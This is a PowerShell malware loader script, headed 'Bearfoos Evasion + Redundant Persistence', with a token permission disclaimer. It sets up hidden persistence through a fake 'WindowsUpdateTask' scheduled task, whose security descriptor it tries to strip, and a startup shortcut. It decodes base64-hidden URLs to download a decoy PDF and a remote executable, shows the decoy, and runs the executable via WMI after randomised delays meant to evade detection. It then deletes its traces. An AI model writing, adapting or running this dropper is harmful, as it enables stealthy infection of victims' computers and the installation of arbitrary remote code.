# launcher.ps1 - Bearfoos Evasion + Redundant Persistence (Scheduled Task + Startup LNK)
# WARNING: Use only on systems you own or have explicit written permission to test.

$ErrorActionPreference = 'SilentlyContinue'

# === SELF-PRESERVATION: Ensure script is saved to disk ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch {
            exit
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task (primary) ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
    } catch {}
}

# === PERSISTENCE: Startup Folder LNK (backup) ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}

# === MAIN PAYLOAD: Download and execute with evasion ===
Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

# === FIRST-RUN FLAG (Prevents PDF from opening on every reboot) ===
$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

# Base64-encoded URLs
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

# Download PDF (only on first run, and only if missing)
if ($isFirstRun -and -not (Test-Path $pdfPath)) {
    try {
        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
    } catch {}
}

Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

# Download EXE (only if missing, with retry)
if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

# Open PDF decoy ONLY on first run (user-triggered via LNK)
if ($isFirstRun -and (Test-Path $pdfPath)) {
    try { Start-Process $pdfPath } catch {}
    # Create flag to prevent future PDF openings
    New-Item -Path $flagFile -ItemType File -Force | Out-Null
}

# Long delay before launching EXE
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# Launch EXE using WMI process creation
if (Test-Path $exePath) {
    try {
        $wmiParams = @{
            ComputerName = $env:COMPUTERNAME
            CommandLine  = "`"$exePath`""
        }
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
    } catch {
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $wsh.Run("`"$exePath`"", 0, $false)
        } catch {
            Start-Process $exePath -WindowStyle Hidden
        }
    }
}

# Cleanup after 5 minutes
Start-Job -ScriptBlock {
    param($exe, $pdf)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
